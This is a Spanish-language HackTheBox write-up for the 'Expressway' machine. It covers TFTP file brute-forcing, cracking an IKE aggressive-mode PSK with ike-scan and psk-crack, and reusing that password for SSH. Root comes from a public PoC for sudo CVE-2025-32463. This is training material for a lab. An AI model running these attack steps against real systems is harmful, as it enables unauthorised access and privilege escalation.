+++
title = "HackTheBox - Expressway"
draft = false
description = "Resolución de la máquina Expressway"
tags = ["HTB", "Linux", "Easy", "IPSec", "Cisco", "TFTP", "Sudo", "CVE"]
summary = "OS: Linux | Dificultad: Easy | Conceptos: IPSec, Cisco, TFTP, Sudo, CVE Público"
categories = ["Writeups"]
showToc = true
showRelated = true
date = "2025-12-25T00:00:00"
+++

* Dificultad: `easy`
* Tiempo aprox. `~4h (contando con la búsqueda sobre IPSec)`
* **Datos Iniciales**: `10.10.11.87`

### Nmap Scan

Tras realizar un escaneo nmap completo, se encuentran los siguientes puertos abiertos:

```shell
#TCP
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)

#UDP
PORT     STATE         SERVICE   VERSION
69/udp   open          tftp      Netkit tftpd or atftpd
500/udp  open          isakmp?
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
4500/udp open|filtered nat-t-ike
```

Puertos abiertos:

* `22/TCP` (SSH): Común en máquinas HTB, no parece que podamos hacer mucho de momento.
* `69/UDP` (TFTP): Probaremos a buscar archivos por fuerza bruta (TFTP no permite listar archivos ni tiene auth.)
* `500/UDP` (ISAKMP): Al momento de hacer la máquina no sabía qué era, así que partimos de eso.
* `4500/UDP` (NAT-T-IKE): Igual que para `isakmp`.

### Análisis Inicial

#### TFTP
Metasploit tiene un módulo que permite hacer fuerza bruta a archivos en TFTP, así que lo usaremos:
```bash
msf > use auxiliary/scanner/tftp/tftpbrute 
msf auxiliary(scanner/tftp/tftpbrute) > set RHOSTS 10.10.11.87
msf auxiliary(scanner/tftp/tftpbrute) > run
[+] Found ciscortr.cfg on 10.10.11.87
[+] Found firmware.bin on 10.10.11.87
[+] Found s10d01b2_2.bin on 10.10.11.87
[+] Found firewall-nat.cfg on 10.10.11.87
[+] Found router.cfg on 10.10.11.87
[*] Scanned 1 of 1 hosts (100% complete)
```

Hemos encontrado 5 archivos relevantes: `ciscortr.cfg`, `firmware.bin`, `s10d01b2_2.bin`, `firewall-nat.cfg`, `router.cfg`, pese a esto, varios de ellos parecen falsos positivos:
```bash
tftp 10.10.11.87
ftp> get firewall-nat.cfg
Error code 1: File not found
tftp> get router.cfg
Error code 1: File not found
... # Y así con firmware.bin y s10d01b2_2.bin
```

Nos quedamos con el único restante que sí existe: `ciscortr.cfg`.

#### Contexto de los demás servicios
Antes de mirar `ciscortr.cfg` sin saber con qué estaba tratando, intento saber ante qué nos encontramos. Tras buscar por un rato, encuentro la respuesta:
- Los puertos 500 y 4500 indican que estamos ante un servidor que actúa como IPSec VPN Gateway.
 - IPSec es un conjunto de protocolos usados para crear túneles cifrados entre dispositivos. Para establecer estos túneles, los dispositivos necesitan acordar varias cosas: Lenguajes y claves, y ahí es donde entran en juego ISAKMP e IKE.

### Obtención del PSK
Como de momento no vamos a usar NAT para nada, podemos ignorar `nat-t-ike`, que es un servicio de compatibilidad para NAT.

> De momento, *el objetivo principal que definimos es conseguir las credenciales para la VPN*

Volviendo al archivo de antes (`ciscortr.cfg`), tras una búsqueda descubrimos que se trata de un archivo backup de la config. de un router cisco (para poder restablecerlo si crashea). En este archivo encontramos:
```ciscortr.cfg
--
crypto isakmp client configuration group rtr-remote

	key secret-password

	dns 208.67.222.222
--
	connect auto

	group 2 key secret-password

	mode client
--

...[SNIP]...
username ike password *****

```
- El nombre del grupo: `rtr-remote`
- Un nombre de usuario para el grupo: `ike`

Dado que necesitamos el PSK y `secret-password` es simplemente un placeholder para el PSK actual, podemos, aprovechando que el modo agresivo de IKE probablemente esté activado, conseguir el hash del PSK y crackearlo offline:

```bash
ike-scan -M --aggressive -n ike@expressway.htb 10.10.11.87  --pskcrack=hash
# Se dumpea el hash del PSK al archivo "hash"

psk-crack -d /usr/share/wordlists/rockyou.txt hash
Running in dictionary cracking mode
key "<Contraseña>" matches SHA1 hash ...
```

### Foothold inicial
Ahora que tenemos el PSK, dado que todavía no tenemos la contraseña para el usuario `ike` para XAuth, probamos la contraseña contra `ssh:ike@expressway.htb`:
```bash
ssh ike@expressway.htb
Password for ike: ...

ike@expressway:~$ # Conseguimos el user flag.
```

### Escalada de privilegios
Tras un vistazo inicial, veo que hay un binario extraño con el SUID bit puesto: `/usr/sbin/exim4`. Al buscarlo en google, veo que se trata de un servicio encargado de recibir emails y dejarlos en su correspondientes lugar (Normalmente `/var/mail/...`). Al parecer, el SUID bit era necesario para el funcionamiento de `exim`, y en esta versión específica (4.98.2) no había ninguna vulnerabilidad específica conocida, además, pese a estar SMTP abierto en localhost, no había mucho que hacer por ahí.

Cambiando el enfoque, al ejecutar `linPEAS` veo que la versión de `sudo` es `1.9.17`:
```bash
sudo --version
Sudo version 1.9.17
```

Al parecer, esta y otras versiones son vulnerables a una escalada de privilegios (*CVE-2025-32463*) gracias al flag `-R` (chroot), que servía para ejecutar un comando dentro de un entorno chroot.

Normalmente, con el flag `-R`, se debería comprobar *primero* si tenemos permitido hacer sudo, y luego cambiarnos al chroot con los permisos, pero en la versión vulnerable, se hace el chroot antes de comprobar que tenemos los permisos necesarios.

Esta vulnerabilidad puede comprobarse haciendo, p.ej y [según un PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), lo siguiente:
```bash
# Versión vulnerable
sudo -R woot woot 
sudo: woot: No such file or directory
```

```bash
# Versión no vulnerable (se comprueban privilegios antes de comprobar directorio para chroot)
sudo -R woot woot 
[sudo] password for pwn:
```

Así que usando el [PoC mencionado](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), conseguimos escalar privilegios:
```bash
ike@expressway:/tmp$ ./sudo-chwoot.sh 
woot!
root@expressway:/tmp# cd
root@expressway:~# cat root.txt
```

Y terminamos.
